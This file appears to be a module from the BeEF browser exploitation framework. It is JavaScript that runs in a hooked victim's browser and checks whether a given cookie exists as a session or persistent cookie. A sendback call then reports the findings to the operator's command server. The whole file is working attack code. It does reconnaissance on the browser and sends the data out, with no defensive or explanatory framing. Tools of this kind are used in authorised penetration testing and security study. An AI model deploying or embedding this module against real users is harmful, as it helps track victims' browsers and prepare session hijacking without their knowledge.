beef.execute(function() {

	var sessionResult = beef.browser.cookie.hasSessionCookies("<%= @cookie %>");
	var persistentResult = beef.browser.cookie.hasPersistentCookies("<%= @cookie %>");

	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "has_session_cookies="+sessionResult+
			"&has_persistent_cookies="+persistentResult+"&cookie=<%= @cookie %>");
});

